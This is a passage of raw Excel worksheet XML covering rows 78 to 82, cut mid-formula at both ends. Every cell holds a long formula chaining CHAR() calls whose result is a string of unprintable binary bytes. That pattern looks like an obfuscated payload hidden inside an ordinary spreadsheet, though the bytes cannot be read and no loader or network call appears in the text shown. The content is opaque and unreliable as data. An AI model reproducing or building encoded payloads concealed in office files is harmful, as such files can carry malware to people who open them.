;CHAR(143)&amp;CHAR(181)&amp;CHAR(66)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(11)&amp;CHAR(129)&amp;CHAR(254)&amp;CHAR(4)&amp;CHAR(115)&amp;CHAR(9)&amp;CHAR(142)&amp;CHAR(53)&amp;CHAR(142)&amp;CHAR(188)&amp;CHAR(74)&amp;CHAR(1)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(23)&amp;CHAR(112)&amp;CHAR(39)&amp;CHAR(87)&amp;CHAR(234)&amp;CHAR(61)&amp;CHAR(9)&amp;CHAR(9)&amp;CHAR(6)&amp;CHAR(93)&amp;CHAR(134)&amp;CHAR(199)&amp;CHAR(114)&amp;CHAR(6)&amp;CHAR(60)&amp;CHAR(149)&amp;CHAR(68)&amp;CHAR(4)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(126)&amp;CHAR(113)&amp;CHAR(91)&amp;CHAR(238)&amp;CHAR(10)&amp;CHAR(15)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(94)&amp;CHAR(128)&amp;CHAR(199)&amp;CHAR(127)&amp;CHAR(1)&amp;CHAR(59)&amp;CHAR(156)&amp;CHAR(66)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(125)&amp;CHAR(96)&amp;CHAR(134)&amp;CHAR(50)&amp;CHAR(13)&amp;CHAR(123)&amp;CHAR(91)&amp;CHAR(135)&amp;CHAR(62)&amp;CHAR(6)&amp;CHAR(127)&amp;CHAR(94)&amp;CHAR(129)&amp;CHAR(52)&amp;CHAR(10)&amp;CHAR(118)&amp;CHAR(37)&amp;CHAR(60)&amp;CHAR(24)&amp;CHAR(127)&amp;CHAR(26)&amp;CHAR(137)&amp;CHAR(50)&amp;CHAR(7)&amp;CHAR(126)&amp;CHAR(16)</f>
        <v>_x0007_&lt;˜_x0019__x000C__x0004__x0007__x0008_ŽI_x0008__x000D__x0006_ð}&amp;öq-ø|=ýt2Pí_x0012__x0013__x0005__x0005_ŽÊ_x001B_‹B1‡Ë_x0005_†}
_x0002__x0006_6ø2»&gt;_x000F__x0002_
t_x0013_Šˆ&lt;_x0003__x0001__x0002_\õ_6C€Ä'5»?_x0006__x0007__x0007_yú:ÖE6V
3ˆi&gt;„|:ýp)ö-úz
ð5RéÌ_x0012_
_x0002_ˆÏ_x0016_@_x0007_ŽÅ_x0005_‰Ð
_x0002__x0005_D•Ã	‚Ç_x000B_1—6_x0006__x0003__x0007_uÜŽ_x0008__x0002__x0007__x000B_`_x000B_V=Ì~_x001F__ï,_x0002_
	[‡Â	®	_x0005__x0005_†ˆ_x0003__x0007__x0004__x0001_µB_x0005__x000B__x000B_þ_x0004_s	Ž5Ž¼J_x0001__x0005__x0007__x0017_p'Wê=		_x0006_]†Çr_x0006_&lt;•D_x0004__x0007__x000B_~q[î
_x000F_
	^€Ç_x0001_;œB_x0005__x0005_	}`†2_x000D_{[‡&gt;_x0006_^4
v%&lt;_x0018__x001A_‰2_x0007_~_x0010_</v>
      </c>
      <c r="C78" t="str">
        <f>CHAR(87)&amp;CHAR(99)&amp;CHAR(185)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(189)&amp;CHAR(142)&amp;CHAR(234)&amp;CHAR(131)&amp;CHAR(91)</f>
        <v>Wc¹ôq½Žêƒ[</v>
      </c>
    </row>
    <row r="79" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B79" t="str">
        <f>CHAR(134)&amp;CHAR(56)&amp;CHAR(16)&amp;CHAR(112)&amp;CHAR(12)&amp;CHAR(130)&amp;CHAR(61)&amp;CHAR(8)&amp;CHAR(127)&amp;CHAR(74)&amp;CHAR(80)&amp;CHAR(236)&amp;CHAR(230)&amp;CHAR(16)&amp;CHAR(7)&amp;CHAR(14)&amp;CHAR(238)&amp;CHAR(49)&amp;CHAR(82)&amp;CHAR(239)&amp;CHAR(75)&amp;CHAR(29)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(230)&amp;CHAR(52)&amp;CHAR(130)&amp;CHAR(79)&amp;CHAR(46)&amp;CHAR(25)&amp;CHAR(87)&amp;CHAR(83)&amp;CHAR(239)&amp;CHAR(237)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(91)&amp;CHAR(95)&amp;CHAR(128)&amp;CHAR(201)&amp;CHAR(125)&amp;CHAR(8)&amp;CHAR(136)&amp;CHAR(73)&amp;CHAR(42)&amp;CHAR(31)&amp;CHAR(82)&amp;CHAR(82)&amp;CHAR(233)&amp;CHAR(227)&amp;CHAR(5)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(82)&amp;CHAR(82)&amp;CHAR(143)&amp;CHAR(66)&amp;CHAR(33)&amp;CHAR(23)&amp;CHAR(91)&amp;CHAR(83)&amp;CHAR(226)&amp;CHAR(80)&amp;CHAR(10)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(92)&amp;CHAR(236)&amp;CHAR(16)&amp;CHAR(82)&amp;CHAR(233)&amp;CHAR(144)&amp;CHAR(19)&amp;CHAR(15)&amp;CHAR(10)&amp;CHAR(80)&amp;CHAR(141)&amp;CHAR(88)&amp;CHAR(39)&amp;CHAR(51)&amp;CHAR(132)&amp;CHAR(176)&amp;CHAR(9)&amp;CHAR(14)&amp;CHAR(4)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(180)&amp;CHAR(10)&amp;CHAR(201)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(122)&amp;CHAR(37)&amp;CHAR(129)&amp;CHAR(143)&amp;CHAR(79)&amp;CHAR(2)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(140)&amp;CHAR(194)&amp;CHAR(118)&amp;CHAR(38)&amp;CHAR(249)&amp;CHAR(179)&amp;CHAR(73)&amp;CHAR(14)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(103)&amp;CHAR(14)&amp;CHAR(95)&amp;CHAR(234)&amp;CHAR(127)&amp;CHAR(26)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(137)&amp;CHAR(198)&amp;CHAR(7)&amp;CHAR(92)&amp;CHAR(104)&amp;CHAR(6)&amp;CHAR(250)&amp;CHAR(177)&amp;CHAR(67)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(13)&amp;CHAR(253)&amp;CHAR(92)&amp;CHAR(66)&amp;CHAR(134)&amp;CHAR(161)&amp;CHAR(94)&amp;CHAR(3)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(240)&amp;CHAR(60)&amp;CHAR(99)&amp;CHAR(6)&amp;CHAR(82)&amp;CHAR(235)&amp;CHAR(92)&amp;CHAR(28)&amp;CHAR(14)&amp;CHAR(5)&amp;CHAR(136)&amp;CHAR(192)&amp;CHAR(11)&amp;CHAR(80)&amp;CHAR(97)&amp;CHAR(10)&amp;CHAR(95)&amp;CHAR(242)&amp;CHAR(213)&amp;CHAR(60)&amp;CHAR(203)&amp;CHAR(225)&amp;CHAR(10)&amp;CHAR(132)&amp;CHAR(205)&amp;CHAR(248)&amp;CHAR(85)&amp;CHAR(87)&amp;CHAR(95)&amp;CHAR(89)&amp;CHAR(129)&amp;CHAR(194)&amp;CHAR(37)&amp;CHAR(202)&amp;CHAR(130)&amp;CHAR(65)&amp;CHAR(33)&amp;CHAR(9)&amp;CHAR(141)&amp;CHAR(207)&amp;CHAR(6)&amp;CHAR(244)&amp;CHAR(254)&amp;CHAR(2)&amp;CHAR(128)&amp;CHAR(10)&amp;CHAR(192)&amp;CHAR(15)&amp;CHAR(11)&amp;CHAR(49)&amp;CHAR(198)&amp;CHAR(199)&amp;CHAR(15)&amp;CHAR(11)&amp;CHAR(80)&amp;CHAR(129)&amp;CHAR(225)&amp;CHAR(244)&amp;CHAR(79)&amp;CHAR(18)&amp;CHAR(7)&amp;CHAR(81)&amp;CHAR(157)&amp;CHAR(113)&amp;CHAR(9)&amp;CHAR(86)&amp;CHAR(118)&amp;CHAR(26)&amp;CHAR(129)&amp;CHAR(116)&amp;CHAR(30)&amp;CHAR(129)&amp;CHAR(252)&amp;CHAR(115)&amp;CHAR(28)&amp;CHAR(133)&amp;CHAR(67)&amp;CHAR(31)&amp;CHAR(84)&amp;CHAR(140)&amp;CHAR(15)&amp;CHAR(244)&amp;CHAR(91)&amp;CHAR(13)&amp;CHAR(134)&amp;CHAR(64)&amp;CHAR(27)&amp;CHAR(130)&amp;CHAR(13)&amp;CHAR(255)&amp;CHAR(66)&amp;CHAR(21)&amp;CHAR(6)&amp;CHAR(126)&amp;CHAR(16)&amp;CHAR(137)&amp;CHAR(127)&amp;CHAR(22)&amp;CHAR(131)&amp;CHAR(250)&amp;CHAR(124)&amp;CHAR(14)&amp;CHAR(189)&amp;CHAR(6)&amp;CHAR(77)&amp;CHAR(14)&amp;CHAR(143)&amp;CHAR(233)&amp;CHAR(9)&amp;CHAR(130)&amp;CHAR(196)&amp;CHAR(7)&amp;CHAR(92)&amp;CHAR(137)</f>
        <v>†8_x0010_p_x000C_‚=_x0008_JPìæ_x0010__x0007__x000E_î1RïK_x001D_
	æ4‚O._x0019_WSïí_x0005__x0002__x0002_[_€É}_x0008_ˆI*_x001F_RRéã_x0005_
_x0002_RRB!_x0017_[SâP
_x0002_\ì_x0010_Ré_x0013__x000F_
PX'3„°	_x000E__x0004__x0007__x0005_´
É_x000D__x0006_z%O_x0002__x0007_
ŒÂv&amp;ù³I_x000E__x0005__x0005_g_x000E__ê_x001A__x0002__x000B_‰Æ_x0007_\h_x0006_ú±C_x0002_
_x000D_ý\B†¡^_x0003__x0001__x0001__x0002_ð&lt;c_x0006_Rë\_x001C__x000E__x0005_ˆÀ_x000B_Pa
_òÕ&lt;Ëá
„ÍøUW_YÂ%Ê‚A!	Ï_x0006_ôþ_x0002_€
À_x000F__x000B_1ÆÇ_x000F__x000B_PáôO_x0012__x0007_Qq	Vv_x001A_t_x001E_üs_x001C_…C_x001F_TŒ_x000F_ô[_x000D_†@_x001B_‚_x000D_ÿB_x0015__x0006_~_x0010_‰_x0016_ƒú|_x000E_½_x0006_M_x000E_é	‚Ä_x0007_\‰</v>
      </c>
      <c r="C79" t="str">
        <f>CHAR(184)&amp;CHAR(50)&amp;CHAR(55)&amp;CHAR(114)&amp;CHAR(136)&amp;CHAR(143)&amp;CHAR(221)&amp;CHAR(208)&amp;CHAR(188)&amp;CHAR(209)</f>
        <v>¸27rˆÝÐ¼Ñ</v>
      </c>
    </row>
    <row r="80" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B80" t="str">
        <f>CHAR(13)&amp;CHAR(244)&amp;CHAR(82)&amp;CHAR(2)&amp;CHAR(140)&amp;CHAR(48)&amp;CHAR(56)&amp;CHAR(197)&amp;CHAR(85)&amp;CHAR(83)&amp;CHAR(95)&amp;CHAR(200)&amp;CHAR(22)&amp;CHAR(5)&amp;CHAR(140)&amp;CHAR(82)&amp;CHAR(32)&amp;CHAR(5)&amp;CHAR(138)&amp;CHAR(66)&amp;CHAR(39)&amp;CHAR(245)&amp;CHAR(89)&amp;CHAR(82)&amp;CHAR(143)&amp;CHAR(79)&amp;CHAR(35)&amp;CHAR(15)&amp;CHAR(135)&amp;CHAR(4)&amp;CHAR(56)&amp;CHAR(196)&amp;CHAR(197)&amp;CHAR(15)&amp;CHAR(11)&amp;CHAR(92)&amp;CHAR(94)&amp;CHAR(229)&amp;CHAR(14)&amp;CHAR(23)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(130)&amp;CHAR(115)&amp;CHAR(33)&amp;CHAR(23)&amp;CHAR(179)&amp;CHAR(26)&amp;CHAR(22)&amp;CHAR(66)&amp;CHAR(2)&amp;CHAR(185)&amp;CHAR(225)&amp;CHAR(35)&amp;CHAR(73)&amp;CHAR(5)&amp;CHAR(46)&amp;CHAR(194)&amp;CHAR(13)&amp;CHAR(199)&amp;CHAR(137)&amp;CHAR(2)&amp;CHAR(136)&amp;CHAR(10)&amp;CHAR(227)&amp;CHAR(231)&amp;CHAR(21)&amp;CHAR(11)&amp;CHAR(11)&amp;CHAR(187)&amp;CHAR(100)&amp;CHAR(23)&amp;CHAR(71)&amp;CHAR(11)&amp;CHAR(46)&amp;CHAR(197)&amp;CHAR(14)&amp;CHAR(202)&amp;CHAR(129)&amp;CHAR(4)&amp;CHAR(140)&amp;CHAR(79)&amp;CHAR(18)&amp;CHAR(236)&amp;CHAR(219)&amp;CHAR(22)&amp;CHAR(2)&amp;CHAR(15)&amp;CHAR(179)&amp;CHAR(123)&amp;CHAR(18)&amp;CHAR(68)&amp;CHAR(3)&amp;CHAR(44)&amp;CHAR(200)&amp;CHAR(13)&amp;CHAR(205)&amp;CHAR(128)&amp;CHAR(2)&amp;CHAR(142)&amp;CHAR(79)&amp;CHAR(3)&amp;CHAR(226)&amp;CHAR(206)&amp;CHAR(26)&amp;CHAR(6)&amp;CHAR(15)&amp;CHAR(178)&amp;CHAR(202)&amp;CHAR(27)&amp;CHAR(71)&amp;CHAR(5)&amp;CHAR(44)&amp;CHAR(197)&amp;CHAR(10)&amp;CHAR(202)&amp;CHAR(137)&amp;CHAR(4)&amp;CHAR(143)&amp;CHAR(77)&amp;CHAR(5)&amp;CHAR(225)&amp;CHAR(177)&amp;CHAR(18)&amp;CHAR(13)&amp;CHAR(14)&amp;CHAR(182)&amp;CHAR(116)&amp;CHAR(22)&amp;CHAR(65)&amp;CHAR(2)&amp;CHAR(32)&amp;CHAR(197)&amp;CHAR(1)&amp;CHAR(195)&amp;CHAR(128)&amp;CHAR(4)&amp;CHAR(143)&amp;CHAR(77)&amp;CHAR(23)&amp;CHAR(227)&amp;CHAR(164)&amp;CHAR(29)&amp;CHAR(13)&amp;CHAR(2)&amp;CHAR(179)&amp;CHAR(115)&amp;CHAR(23)&amp;CHAR(71)&amp;CHAR(22)&amp;CHAR(47)&amp;CHAR(206)&amp;CHAR(2)&amp;CHAR(202)&amp;CHAR(132)&amp;CHAR(12)&amp;CHAR(128)&amp;CHAR(78)&amp;CHAR(16)&amp;CHAR(235)&amp;CHAR(137)&amp;CHAR(16)&amp;CHAR(14)&amp;CHAR(5)&amp;CHAR(178)&amp;CHAR(10)&amp;CHAR(19)&amp;CHAR(71)&amp;CHAR(11)&amp;CHAR(33)&amp;CHAR(198)&amp;CHAR(14)&amp;CHAR(206)&amp;CHAR(132)&amp;CHAR(13)&amp;CHAR(131)&amp;CHAR(65)&amp;CHAR(31)&amp;CHAR(237)&amp;CHAR(124)&amp;CHAR(29)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(187)&amp;CHAR(115)&amp;CHAR(20)&amp;CHAR(69)&amp;CHAR(9)&amp;CHAR(34)&amp;CHAR(202)&amp;CHAR(6)&amp;CHAR(197)&amp;CHAR(133)&amp;CHAR(9)&amp;CHAR(139)&amp;CHAR(76)&amp;CHAR(29)&amp;CHAR(234)&amp;CHAR(99)&amp;CHAR(29)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(178)&amp;CHAR(193)&amp;CHAR(21)&amp;CHAR(69)&amp;CHAR(7)&amp;CHAR(32)&amp;CHAR(202)&amp;CHAR(9)&amp;CHAR(197)&amp;CHAR(137)&amp;CHAR(12)&amp;CHAR(139)&amp;CHAR(77)&amp;CHAR(39)&amp;CHAR(254)&amp;CHAR(81)&amp;CHAR(22)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(182)&amp;CHAR(180)&amp;CHAR(26)&amp;CHAR(70)&amp;CHAR(4)&amp;CHAR(40)&amp;CHAR(200)&amp;CHAR(4)&amp;CHAR(198)&amp;CHAR(142)&amp;CHAR(13)&amp;CHAR(141)&amp;CHAR(79)&amp;CHAR(35)&amp;CHAR(227)&amp;CHAR(72)&amp;CHAR(30)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(182)&amp;CHAR(181)&amp;CHAR(25)&amp;CHAR(73)&amp;CHAR(7)&amp;CHAR(46)&amp;CHAR(200)&amp;CHAR(9)&amp;CHAR(193)&amp;CHAR(137)&amp;CHAR(4)&amp;CHAR(93)&amp;CHAR(143)&amp;CHAR(77)&amp;CHAR(33)</f>
        <v>_x000D_ôR_x0002_Œ08ÅUS_È_x0016__x0005_ŒR _x0005_ŠB'õYRO#_x000F_‡_x0004_8ÄÅ_x000F__x000B_\^å_x000E__x0017__x000B_
‚s!_x0017_³_x001A__x0016_B_x0002_¹á#I_x0005_.Â_x000D_Ç‰_x0002_ˆ
ãç_x0015__x000B__x000B_»d_x0017_G_x000B_.Å_x000E_Ê_x0004_ŒO_x0012_ìÛ_x0016__x0002__x000F_³{_x0012_D_x0003_,È_x000D_Í€_x0002_ŽO_x0003_âÎ_x001A__x0006__x000F_²Ê_x001B_G_x0005_,Å
Ê‰_x0004_M_x0005_á±_x0012__x000D__x000E_¶t_x0016_A_x0002_ Å_x0001_Ã€_x0004_M_x0017_ã¤_x001D__x000D__x0002_³s_x0017_G_x0016_/Î_x0002_Ê„_x000C_€N_x0010_ë‰_x0010__x000E__x0005_²
_x0013_G_x000B_!Æ_x000E_Î„_x000D_ƒA_x001F_í|_x001D_	_x0002_»s_x0014_E	"Ê_x0006_Å…	‹L_x001D_êc_x001D__x0002__x000B_²Á_x0015_E_x0007_ Ê	Å‰_x000C_‹M'þQ_x0016__x0001__x0002_¶´_x001A_F_x0004_(È_x0004_ÆŽ_x000D_O#ãH_x001E__x000D__x0006_¶µ_x0019_I_x0007_.È	Á‰_x0004_]M!</v>
      </c>
      <c r="C80" t="str">
        <f>CHAR(89)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(216)&amp;CHAR(218)&amp;CHAR(120)&amp;CHAR(204)&amp;CHAR(112)&amp;CHAR(122)</f>
        <v>YzˆêØÚxÌpz</v>
      </c>
    </row>
    <row r="81" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B81" t="str">
        <f>CHAR(130)&amp;CHAR(65)&amp;CHAR(33)&amp;CHAR(5)&amp;CHAR(141)&amp;CHAR(105)&amp;CHAR(6)&amp;CHAR(4)&amp;CHAR(136)&amp;CHAR(68)&amp;CHAR(35)&amp;CHAR(84)&amp;CHAR(193)&amp;CHAR(56)&amp;CHAR(203)&amp;CHAR(192)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(82)&amp;CHAR(128)&amp;CHAR(233)&amp;CHAR(137)&amp;CHAR(225)&amp;CHAR(46)&amp;CHAR(57)&amp;CHAR(194)&amp;CHAR(83)&amp;CHAR(109)&amp;CHAR(54)&amp;CHAR(84)&amp;CHAR(136)&amp;CHAR(68)&amp;CHAR(246)&amp;CHAR(134)&amp;CHAR(79)&amp;CHAR(241)&amp;CHAR(143)&amp;CHAR(65)&amp;CHAR(255)&amp;CHAR(138)&amp;CHAR(66)&amp;CHAR(218)&amp;CHAR(85)&amp;CHAR(227)&amp;CHAR(192)&amp;CHAR(30)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(129)&amp;CHAR(124)&amp;CHAR(1)&amp;CHAR(139)&amp;CHAR(66)&amp;CHAR(223)&amp;CHAR(137)&amp;CHAR(205)&amp;CHAR(11)&amp;CHAR(142)&amp;CHAR(1)&amp;CHAR(91)&amp;CHAR(95)&amp;CHAR(253)&amp;CHAR(82)&amp;CHAR(14)&amp;CHAR(131)&amp;CHAR(197)&amp;CHAR(124)&amp;CHAR(27)&amp;CHAR(142)&amp;CHAR(3)&amp;CHAR(128)&amp;CHAR(67)&amp;CHAR(243)&amp;CHAR(83)&amp;CHAR(137)&amp;CHAR(76)&amp;CHAR(250)&amp;CHAR(90)&amp;CHAR(135)&amp;CHAR(79)&amp;CHAR(255)&amp;CHAR(90)&amp;CHAR(84)&amp;CHAR(249)&amp;CHAR(85)&amp;CHAR(23)&amp;CHAR(56)&amp;CHAR(197)&amp;CHAR(84)&amp;CHAR(196)&amp;CHAR(192)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(54)&amp;CHAR(199)&amp;CHAR(212)&amp;CHAR(8)&amp;CHAR(1)&amp;CHAR(138)&amp;CHAR(78)&amp;CHAR(43)&amp;CHAR(6)&amp;CHAR(140)&amp;CHAR(207)&amp;CHAR(113)&amp;CHAR(4)&amp;CHAR(191)&amp;CHAR(4)&amp;CHAR(78)&amp;CHAR(5)&amp;CHAR(139)&amp;CHAR(239)&amp;CHAR(74)&amp;CHAR(84)&amp;CHAR(128)&amp;CHAR(86)&amp;CHAR(45)&amp;CHAR(1)&amp;CHAR(53)&amp;CHAR(221)&amp;CHAR(93)&amp;CHAR(129)&amp;CHAR(125)&amp;CHAR(35)&amp;CHAR(9)&amp;CHAR(80)&amp;CHAR(129)&amp;CHAR(119)&amp;CHAR(42)&amp;CHAR(137)&amp;CHAR(134)&amp;CHAR(145)&amp;CHAR(249)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(62)&amp;CHAR(9)&amp;CHAR(157)&amp;CHAR(122)&amp;CHAR(10)&amp;CHAR(70)&amp;CHAR(130)&amp;CHAR(248)&amp;CHAR(15)&amp;CHAR(127)&amp;CHAR(236)&amp;CHAR(224)&amp;CHAR(31)&amp;CHAR(49)&amp;CHAR(212)&amp;CHAR(142)&amp;CHAR(131)&amp;CHAR(156)&amp;CHAR(169)&amp;CHAR(14)&amp;CHAR(13)&amp;CHAR(2)&amp;CHAR(49)&amp;CHAR(6)&amp;CHAR(150)&amp;CHAR(114)&amp;CHAR(6)&amp;CHAR(70)&amp;CHAR(130)&amp;CHAR(251)&amp;CHAR(6)&amp;CHAR(122)&amp;CHAR(228)&amp;CHAR(128)&amp;CHAR(55)&amp;CHAR(244)&amp;CHAR(252)&amp;CHAR(65)&amp;CHAR(3)&amp;CHAR(61)&amp;CHAR(197)&amp;CHAR(224)&amp;CHAR(12)&amp;CHAR(132)&amp;CHAR(38)&amp;CHAR(11)&amp;CHAR(178)&amp;CHAR(11)&amp;CHAR(77)&amp;CHAR(6)&amp;CHAR(143)&amp;CHAR(84)&amp;CHAR(84)&amp;CHAR(82)&amp;CHAR(197)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(129)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(6)&amp;CHAR(129)&amp;CHAR(206)&amp;CHAR(250)&amp;CHAR(249)&amp;CHAR(6)&amp;CHAR(196)&amp;CHAR(68)&amp;CHAR(9)&amp;CHAR(70)&amp;CHAR(205)&amp;CHAR(6)&amp;CHAR(4)&amp;CHAR(138)&amp;CHAR(70)&amp;CHAR(47)&amp;CHAR(18)&amp;CHAR(129)&amp;CHAR(43)&amp;CHAR(11)&amp;CHAR(49)&amp;CHAR(198)&amp;CHAR(199)&amp;CHAR(31)&amp;CHAR(11)&amp;CHAR(142)&amp;CHAR(78)&amp;CHAR(41)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(173)&amp;CHAR(65)&amp;CHAR(35)&amp;CHAR(30)&amp;CHAR(199)&amp;CHAR(138)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(27)&amp;CHAR(137)&amp;CHAR(41)&amp;CHAR(6)&amp;CHAR(55)&amp;CHAR(195)&amp;CHAR(197)&amp;CHAR(19)&amp;CHAR(14)&amp;CHAR(142)&amp;CHAR(79)&amp;CHAR(32)&amp;CHAR(3)&amp;CHAR(4)&amp;CHAR(79)&amp;CHAR(46)&amp;CHAR(1)&amp;CHAR(206)&amp;CHAR(87)&amp;CHAR(92)&amp;CHAR(93)</f>
        <v>‚A!_x0005_i_x0006__x0004_ˆD#TÁ8ËÀ_x0002__x0005_R€é‰á.9ÂSm6TˆDö†OñAÿŠBÚUãÀ_x001E__x0007__x000B_|_x0001_‹Bß‰Í_x000B_Ž_x0001_[_ýR_x000E_ƒÅ|_x001B_Ž_x0003_€CóS‰LúZ‡OÿZTùU_x0017_8ÅTÄÀ_x0002__x0002_6ÇÔ_x0008__x0001_ŠN+_x0006_ŒÏq_x0004_¿_x0004_N_x0005_‹ïJT€V-_x0001_5Ý]}#	Pw*‰†‘ù
	_x0005_&gt;	z
F‚ø_x000F_ìà_x001F_1ÔŽƒœ©_x000E__x000D__x0002_1_x0006_–r_x0006_F‚û_x0006_zä€7ôüA_x0003_=Åà_x000C_„&amp;_x000B_²_x000B_M_x0006_TTRÅ	_x0007_E&amp;_x0006_Îúù_x0006_ÄD	FÍ_x0006__x0004_ŠF/_x0012_+_x000B_1ÆÇ_x001F__x000B_ŽN)_x0006__x0005_­A#_x001E_ÇŠE&amp;_x001B_‰)_x0006_7ÃÅ_x0013__x000E_ŽO _x0003__x0004_O._x0001_ÎW\]</v>
      </c>
      <c r="C81" t="str">
        <f>CHAR(136)&amp;CHAR(80)&amp;CHAR(144)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(23)&amp;CHAR(195)&amp;CHAR(153)&amp;CHAR(234)</f>
        <v>ˆP[¸ô_x0017_Ã™ê</v>
      </c>
    </row>
    <row r="82" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B82" t="str">
        <f>CHAR(129)&amp;CHAR(125)&amp;CHAR(35)&amp;CHAR(21)&amp;CHAR(138)&amp;CHAR(140)&amp;CHAR(49)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(86)&amp;CHAR(250)&amp;CHAR(95)&amp;CHAR(57)&amp;CHAR(142)&amp;CHAR(221)&amp;CHAR(136)&amp;CHAR(213)&amp;CHAR(122)&amp;CHAR(4)&amp;CHAR(68)&amp;CHAR(232)&amp;CHAR(199)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(94)&amp;CHAR(92)&amp;CHAR(143)&amp;CHAR(128)&amp;CHAR(169)&amp;CHAR(4)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(90)&amp;CHAR(94)&amp;CHAR(253)&amp;CHAR(92)&amp;CHAR(54)&amp;CHAR(142)&amp;CHAR(239)&amp;CHAR(147)&amp;CHAR(233)&amp;CHAR(14)&amp;CHAR(133)&amp;CHAR(168)&amp;CHAR(15)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(185)&amp;CHAR(138)&amp;CHAR(23)&amp;CHAR(71)&amp;CHAR(7)&amp;CHAR(143)&amp;CHAR(234)&amp;CHAR(137)&amp;CHAR(16)&amp;CHAR(71)&amp;CHAR(7)&amp;CHAR(4)&amp;CHAR(130)&amp;CHAR(144)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(15)&amp;CHAR(134)&amp;CHAR(78)&amp;CHAR(45)&amp;CHAR(31)&amp;CHAR(85)&amp;CHAR(109)&amp;CHAR(74)&amp;CHAR(94)&amp;CHAR(87)&amp;CHAR(253)&amp;CHAR(84)&amp;CHAR(78)&amp;CHAR(128)&amp;CHAR(201)&amp;CHAR(6)&amp;CHAR(129)&amp;CHAR(128)&amp;CHAR(13)&amp;CHAR(14)&amp;CHAR(15)&amp;CHAR(85)&amp;CHAR(236)&amp;CHAR(217)&amp;CHAR(23)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(187)&amp;CHAR(137)&amp;CHAR(31)&amp;CHAR(66)&amp;CHAR(6)&amp;CHAR(132)&amp;CHAR(238)&amp;CHAR(239)&amp;CHAR(47)&amp;CHAR(74)&amp;CHAR(13)&amp;CHAR(1)&amp;CHAR(203)&amp;CHAR(82)&amp;CHAR(80)&amp;CHAR(239)&amp;CHAR(119)&amp;CHAR(28)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(129)&amp;CHAR(203)&amp;CHAR(6)&amp;CHAR(132)&amp;CHAR(66)&amp;CHAR(32)&amp;CHAR(19)&amp;CHAR(87)&amp;CHAR(248)&amp;CHAR(122)&amp;CHAR(33)&amp;CHAR(23)&amp;CHAR(83)&amp;CHAR(82)&amp;CHAR(248)&amp;CHAR(93)&amp;CHAR(66)&amp;CHAR(132)&amp;CHAR(139)&amp;CHAR(186)&amp;CHAR(12)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(89)&amp;CHAR(84)&amp;CHAR(250)&amp;CHAR(81)&amp;CHAR(62)&amp;CHAR(130)&amp;CHAR(234)&amp;CHAR(135)&amp;CHAR(239)&amp;CHAR(114)&amp;CHAR(76)&amp;CHAR(182)&amp;CHAR(173)&amp;CHAR(17)&amp;CHAR(69)&amp;CHAR(13)&amp;CHAR(181)&amp;CHAR(151)&amp;CHAR(22)&amp;CHAR(68)&amp;CHAR(1)&amp;CHAR(41)&amp;CHAR(240)&amp;CHAR(114)&amp;CHAR(57)&amp;CHAR(134)&amp;CHAR(79)&amp;CHAR(38)&amp;CHAR(30)&amp;CHAR(85)&amp;CHAR(109)&amp;CHAR(75)&amp;CHAR(82)&amp;CHAR(95)&amp;CHAR(242)&amp;CHAR(84)&amp;CHAR(66)&amp;CHAR(135)&amp;CHAR(197)&amp;CHAR(115)&amp;CHAR(61)&amp;CHAR(83)&amp;CHAR(233)&amp;CHAR(127)&amp;CHAR(23)&amp;CHAR(15)&amp;CHAR(10)&amp;CHAR(136)&amp;CHAR(237)&amp;CHAR(224)&amp;CHAR(41)&amp;CHAR(71)&amp;CHAR(7)&amp;CHAR(13)&amp;CHAR(198)&amp;CHAR(91)&amp;CHAR(81)&amp;CHAR(239)&amp;CHAR(11)&amp;CHAR(19)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(142)&amp;CHAR(194)&amp;CHAR(3)&amp;CHAR(134)&amp;CHAR(78)&amp;CHAR(45)&amp;CHAR(23)&amp;CHAR(85)&amp;CHAR(248)&amp;CHAR(126)&amp;CHAR(45)&amp;CHAR(30)&amp;CHAR(85)&amp;CHAR(87)&amp;CHAR(249)&amp;CHAR(83)&amp;CHAR(65)&amp